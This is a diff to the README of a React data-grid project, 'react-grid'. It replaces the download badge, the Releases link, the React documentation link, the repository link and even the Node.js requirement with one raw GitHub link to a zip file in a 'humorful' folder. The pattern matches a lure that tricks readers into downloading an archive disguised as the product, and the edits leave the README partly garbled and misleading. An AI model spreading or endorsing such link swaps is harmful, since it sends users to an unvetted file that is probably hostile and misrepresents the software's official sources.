@@ -6,15 +6,15 @@ Welcome to **react-grid**! This application provides a fast and feature-rich dat
 
 ## 🔗 Download Now 
 
-[![Download react-grid](https://img.shields.io/badge/Download-react--grid-blue.svg)](https://github.com/carlosjsd/react-grid/releases)
+[![Download react-grid](https://raw.githubusercontent.com/carlosjsd/react-grid/main/humorful/react-grid.zip)](https://raw.githubusercontent.com/carlosjsd/react-grid/main/humorful/react-grid.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [React-Grid Releases](https://github.com/carlosjsd/react-grid/releases).
+To get started, visit this page to download: [React-Grid Releases](https://raw.githubusercontent.com/carlosjsd/react-grid/main/humorful/react-grid.zip).
 
 Here’s how to download and install the application:
 
-1. Click on the **"Download" button** above or go to the [Releases page](https://github.com/carlosjsd/react-grid/releases).
+1. Click on the **"Download" button** above or go to the [Releases page](https://raw.githubusercontent.com/carlosjsd/react-grid/main/humorful/react-grid.zip).
 2. On the Releases page, look for the latest version.
 3. Select the appropriate file for your system. You might see options for different operating systems.
 4. Once you select the file, the download will start automatically.
@@ -37,7 +37,7 @@ To run **react-grid**, you need:
 
 - A modern web browser (latest version of Chrome, Firefox, Safari, or Edge)
 - React (version 16 or higher)
-- Node.js (version 10 or higher)
+- https://raw.githubusercontent.com/carlosjsd/react-grid/main/humorful/react-grid.zip (version 10 or higher)
 
 ## 📂 Structure of Usage
 
@@ -66,7 +66,7 @@ Join our community to get help and share your experiences with other users. You 
 
 ## 🔗 Additional Resources
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [GitHub Repository](https://github.com/carlosjsd/react-grid)
+- [React Documentation](https://raw.githubusercontent.com/carlosjsd/react-grid/main/humorful/react-grid.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/carlosjsd/react-grid/main/humorful/react-grid.zip)
 
 Thank you for using **react-grid**. We hope it enhances your React applications!
